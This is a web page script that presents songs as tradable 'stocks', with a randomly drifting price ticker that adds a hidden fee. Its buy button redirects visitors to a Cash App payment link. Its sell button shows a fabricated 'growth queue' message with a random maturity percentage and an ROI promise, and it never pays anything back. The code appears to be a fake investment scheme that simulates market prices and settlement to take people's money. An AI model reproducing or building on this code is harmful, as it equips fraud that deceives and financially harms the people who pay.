<script>
    // IN-HOUSE SETTLEMENT CONSTANTS (SECURE)
    const _B = 522.00; 
    const _Q = 115;    
    const _R = 2.0;    
    const _F = 0.25;   

    const inventory = [
        { name: "SUPERFLY", audio: "https://firebasestorage.googleapis.com/v0/b/aititrade-radio-97.firebasestorage.app/o/SUPERFLY.mp3?alt=media&token=c5a7d3b4-dc94-4842-93ea-6d396e0fa293", art: "https://firebasestorage.googleapis.com/v0/b/aititrade-radio-97.firebasestorage.app/o/SUPERFLY%20PNG.jpeg?alt=media&token=2441faff-08e2-45dd-b9ba-bdc5a3b6d2fc" },
        { name: "I GOT WHAT YOU NEED", audio: "https://firebasestorage.googleapis.com/v0/b/aititrade-radio-97.firebasestorage.app/o/I%20GOT%20WHAT%20YOU%20NEED.mp3?alt=media&token=a5cf44ea-56ef-49f8-839c-0b9d2c3c250c", art: "https://firebasestorage.googleapis.com/v0/b/aititrade-radio-97.firebasestorage.app/o/I%20GOT%20WHAT%20YOU%20NEED%20COVER.png?alt=media&token=3188b436-bd97-4503-8e12-a1e33bdfd147" },
        { name: "ZODIAC SIGN", audio: "https://firebasestorage.googleapis.com/v0/b/aititrade-radio-97.firebasestorage.app/o/ZODIAC%20SIGN.mp3?alt=media&token=915fde66-5e25-401e-ab03-61a0a5642630", art: "https://firebasestorage.googleapis.com/v0/b/aititrade-radio-97.firebasestorage.app/o/ZODIAC%20SIGN-J.%20MARIE.png?alt=media&token=763cef9d-c8dd-48ad-bc37-f701d1cf6a9a" },
        { name: "SCENE BY SCENE", audio: "https://firebasestorage.googleapis.com/v0/b/aititrade-radio-97.firebasestorage.app/o/SCENE%20BY%20SCENE.mp3?alt=media&token=647413ee-9384-4436-8f0c-9df717d1da0a", art: "https://firebasestorage.googleapis.com/v0/b/aititrade-radio-97.firebasestorage.app/o/SCENE%20BY%20SCENE%20IMG.png?alt=media&token=2838e442-9b05-4704-a407-a209dd754d72" }
    ];

    let index = 0;
    let currentPrice = 1.00;
    const audio = document.getElementById('radio-source');
    const oscillator = document.getElementById('market-oscillator');
    const scroller = document.getElementById('scroller');

    function renderScroller() {
        scroller.innerHTML = inventory.map((item, i) => `
            <div class="select-card" id="card-${i}" style="background-image: url('${item.art}')" onclick="loadAsset(${i})"></div>
        `).join('');
    }

    function loadAsset(i) {
        index = i;
        const a = inventory[i];
        audio.src = a.audio;
        document.getElementById('asset-art').style.backgroundImage = `url("${a.art}")`;
        document.getElementById('asset-label').innerText = `STOCK: ${a.name}`;
        document.querySelectorAll('.select-card').forEach(c => c.classList.remove('active'));
        const activeCard = document.getElementById(`card-${i}`);
        if(activeCard) activeCard.classList.add('active');
        
        // Resetting for new asset hold period
        currentPrice = Math.floor(Math.random() * 3) + 1; 
        audio.play().catch(e => console.log("Interacted needed"));
    }

    // SLOW GROWTH TICKER (5 Second Interval)
    function startEngine() {
        setInterval(() => {
            let last = currentPrice;
            // Bias toward slow doubling
            const change = (Math.random() * 0.03) - 0.01; 
            currentPrice += (currentPrice * change);
            if (currentPrice < 1.00) currentPrice = 1.01;

            oscillator.innerHTML = `${inventory[index].name.split(' ')[0]} ${currentPrice > last ? '▲' : '▼'} $${(currentPrice + _F).toFixed(2)}`;
            oscillator.className = `ticker ${currentPrice > last ? 'gain' : 'loss'}`;
        }, 5000); 
    }

    function executeTrade(type) {
        if(type === 'BUY') {
            window.location.href = `https://cash.app/$AITITRADEBROKERAGE?amount=${(currentPrice + _F).toFixed(2)}`;
        } else {
            // SETTLEMENT STATUS NOTIFICATION
            const maturity = Math.floor(Math.random() * 40) + 60; // Simulated maturity %
            alert(`LEDGER STATUS: ASSET IDENTIFIED\n\nYour position is currently in the GROWTH QUEUE.\n\nMaturity: ${maturity}%\nROI Target: 100% of Principal\n\nNotification will be sent via Cash App tag when you are UP FOR SETTLEMENT.`);
        }
    }

    function nextAsset() { index = (index + 1) % inventory.length; loadAsset(index); }
    function toggleAudio() { audio.paused ? audio.play() : audio.pause(); }
    audio.onended = nextAsset;
    window.onload = () => { renderScroller(); loadAsset(0); startEngine(); };
</script>
